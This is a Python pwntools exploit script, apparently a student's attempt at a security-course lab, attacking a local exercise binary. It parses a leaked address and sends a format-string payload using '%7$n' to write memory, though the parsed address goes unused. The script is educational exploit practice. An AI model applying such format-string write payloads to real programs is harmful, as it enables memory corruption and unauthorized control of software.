#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()
leaked_message = r.recvline()
print(leaked_message.strip())
address_to_modify = int(str(leaked_message.strip()).split(" ")[-1][:-1], 16)
print("address_to_modify: %x" % address_to_modify)


r.recvuntil(b"Enter number of the function to run:\n")
command = b"aaaaaaaaaaaaaa%7$n"
r.sendline(command)
print(r.recvall(timeout=3))


